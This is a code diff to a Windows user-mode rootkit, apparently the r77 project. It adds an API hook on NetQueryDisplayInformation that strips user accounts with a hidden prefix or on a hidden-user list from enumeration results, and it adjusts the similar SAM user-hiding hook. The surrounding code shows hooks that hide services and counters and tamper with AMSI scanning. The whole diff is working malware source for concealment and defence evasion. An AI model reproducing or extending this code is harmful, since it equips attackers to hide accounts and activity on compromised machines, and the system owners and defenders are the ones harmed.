@@ -25,6 +25,7 @@ static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW;
 static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW2;
 static NT_NTDEVICEIOCONTROLFILE OriginalNtDeviceIoControlFile;
 static NT_SAMENUMERATEUSERSINDOMAIN OriginalSamEnumerateUsersInDomain;
+static NT_NETQUERYDISPLAYINFORMATION OriginalNetQueryDisplayInformation;
 static NT_PDHGETRAWCOUNTERARRAYW OriginalPdhGetRawCounterArrayW;
 static NT_PDHGETFORMATTEDCOUNTERARRAYW OriginalPdhGetFormattedCounterArrayW;
 static NT_AMSISCANBUFFER OriginalAmsiScanBuffer;
@@ -58,6 +59,7 @@ VOID InitializeHooks()
 	InstallHook("sechost.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
 	InstallHook("ntdll.dll", "NtDeviceIoControlFile", (LPVOID*)&OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
 	InstallHook("samlib.dll", "SamEnumerateUsersInDomain", (LPVOID*)&OriginalSamEnumerateUsersInDomain, HookedSamEnumerateUsersInDomain);
+	InstallHook("netapi32.dll", "NetQueryDisplayInformation", (LPVOID*)&OriginalNetQueryDisplayInformation, HookedNetQueryDisplayInformation);
 	InstallHook("pdh.dll", "PdhGetRawCounterArrayW", (LPVOID*)&OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
 	InstallHook("pdh.dll", "PdhGetFormattedCounterArrayW", (LPVOID*)&OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
 	InstallHook("amsi.dll", "AmsiScanBuffer", (LPVOID*)&OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
@@ -67,6 +69,8 @@ VOID InitializeHooks()
 	// Unfortunately, the actual enumeration of services happens in services.exe - a protected process that cannot be injected.
 	// The EnumService* methods from advapi32.dll access services.exe through RPC.
 	// There is no longer one single syscall wrapper function to hook, but multiple higher level functions.
+
+	// The same applies to a select few other functions as well. HOWEVER: Any function that is exposed in ntdll WILL be hooked there, not in higher level DLLs.
 
 	TlsNtEnumerateKeyCacheKey = TlsAlloc();
 	TlsNtEnumerateKeyCacheIndex = TlsAlloc();
@@ -97,6 +101,7 @@ VOID UninitializeHooks()
 	UninstallHook(OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
 	UninstallHook(OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
 	UninstallHook(OriginalSamEnumerateUsersInDomain, HookedSamEnumerateUsersInDomain);
+	UninstallHook(OriginalNetQueryDisplayInformation, HookedNetQueryDisplayInformation);
 	UninstallHook(OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
 	UninstallHook(OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
 	UninstallHook(OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
@@ -803,6 +808,26 @@ static NTSTATUS NTAPI HookedSamEnumerateUsersInDomain(HANDLE domainHandle, PULON
 			{
 				memmove(&rids[i], &rids[i + 1], (*countReturned - i - 1) * sizeof(NT_SAM_RID_ENUMERATION));
 				(*countReturned)--;
+				i--;
+			}
+		}
+	}
+
+	return status;
+}
+static NET_API_STATUS WINAPI HookedNetQueryDisplayInformation(LPCWSTR serverName, DWORD level, DWORD index, DWORD entriesRequested, DWORD preferredMaximumLength, LPDWORD returnedEntryCount, PVOID *sortedBuffer)
+{
+	NET_API_STATUS status = OriginalNetQueryDisplayInformation(serverName, level, index, entriesRequested, preferredMaximumLength, returnedEntryCount, sortedBuffer);
+
+	if ((status == ERROR_SUCCESS || status == ERROR_MORE_DATA) && returnedEntryCount && sortedBuffer)
+	{
+		PNT_NET_DISPLAY_USER users = (PNT_NET_DISPLAY_USER)*sortedBuffer;
+		for (DWORD i = 0; i < *returnedEntryCount; i++)
+		{
+			if (HasPrefix(users[i].Name) || IsUserNameHidden(users[i].Name))
+			{
+				memmove(&users[i], &users[i + 1], (*returnedEntryCount - i - 1) * sizeof(NT_NET_DISPLAY_USER));
+				(*returnedEntryCount)--;
 				i--;
 			}
 		}
